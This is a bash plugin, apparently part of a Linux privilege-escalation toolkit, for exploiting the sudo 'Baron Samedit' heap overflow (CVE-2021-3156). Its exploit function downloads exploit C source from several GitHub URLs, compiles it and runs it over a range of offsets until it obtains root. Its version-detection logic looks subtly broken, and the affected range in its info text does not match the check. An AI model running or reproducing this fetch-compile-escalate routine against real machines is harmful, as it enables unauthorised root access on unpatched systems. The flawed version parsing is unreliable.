#!/bin/bash
# Baron Samedit (CVE-2021-3156) Plugin
PLUGIN_NAME="sudo"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="CVE-2021-3156"
PLUGIN_DESCRIPTION="Baron Samedit - Sudo Heap Buffer Overflow"

sudo_detect() {
    log_message "Checking for Baron Samedit vulnerability..." "INFO"
    
    if ! command_exists sudo; then
        log_message "sudo not found - not vulnerable" "INFO"
        return 1
    fi
    
    local sudo_version="$SUDO_VERSION"
    
    if [ -z "$sudo_version" ]; then
        sudo_version=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?(p[0-9]+)?' | head -1)
    fi
    
    local major=$(echo "$sudo_version" | grep -oE '^[0-9]+')
    local minor=$(echo "$sudo_version" | grep -oE '^[0-9]+\.[0-9]+' | cut -d. -f2)
    local patch=$(echo "$sudo_version" | grep -oE '[0-9]+\.p' | tr -d '.p' || echo "0")
    local p_ver=$(echo "$sudo_version" | grep -oE 'p[0-9]+' | tr -d 'p' || echo "0")
    
    # Check if vulnerable: >= 1.8.2 and < 1.9.5p1
    if [ "$major" -eq 1 ]; then
        if [ "$minor" -eq 8 ] && [ "$patch" -ge 2 ]; then
            log_message "System VULNERABLE to Baron Samedit" "WARNING"
            return 0
        elif [ "$minor" -eq 9 ]; then
            if [ "$patch" -lt 5 ] || ([ "$patch" -eq 5 ] && [ "$p_ver" -lt 1 ]); then
                log_message "System VULNERABLE to Baron Samedit" "WARNING"
                return 0
            fi
        fi
    fi
    
    log_message "System NOT vulnerable to Baron Samedit" "INFO"
    return 1
}

sudo_exploit() {
    log_message "Attempting Baron Samedit exploitation..." "INFO"
    
    if ! sudo_detect; then
        return 1
    fi
    
    local exploit_source="${EXPLOIT_DIR}/baronsamedit.c"
    local exploit_binary="${EXPLOIT_DIR}/baronsamedit"
    local exploit_url="${EXPLOIT_SOURCES[sudo]}"
    
    [ -z "$exploit_url" ] && exploit_url="https://raw.githubusercontent.com/lockedbyte/CVE-Exploits/master/CVE-2021-3156/exploit.c"
    
    if ! download_exploit "baronsamedit" "$exploit_url" "$exploit_source"; then
        # Try alternative sources
        local alt_urls=(
            "https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit.c"
            "https://raw.githubusercontent.com/mohinparamasivam/CVE-2021-3156/main/exploit.c"
        )
        
        for url in "${alt_urls[@]}"; do
            if download_exploit "baronsamedit" "$url" "$exploit_source"; then
                break
            fi
        done
        
        if [ ! -f "$exploit_source" ]; then
            log_message "All download attempts failed" "WARNING"
            return 1
        fi
    fi
    
    if ! compile_exploit "$exploit_source" "$exploit_binary"; then
        log_message "Failed to compile Baron Samedit exploit" "WARNING"
        return 1
    fi
    
    log_message "Running Baron Samedit exploit..." "INFO"
    
    # Try different offsets
    for offset in 0 10 20 30 40 50 60 70 80 90 100; do
        timeout_exec 10 "$exploit_binary" "$offset" 2>/dev/null &
        spinner $!
        wait $! 2>/dev/null
        
        if [ "$(id -u)" -eq 0 ]; then
            log_message "Baron Samedit exploit SUCCESSFUL (offset: $offset)!" "SUCCESS"
            return 0
        fi
    done
    
    log_message "Baron Samedit exploit failed" "WARNING"
    return 1
}

sudo_info() {
    cat << 'EOFINFO'
Baron Samedit (CVE-2021-3156)
=============================
A heap-based buffer overflow in sudo that allows privilege escalation
to root via sudoedit -s and a command-line argument ending with a
single backslash character.

Affected: Sudo versions 1.8.2 - 1.9.5p1
Impact: Local privilege escalation to root
Discovery: Qualys Research Team
EOFINFO
}
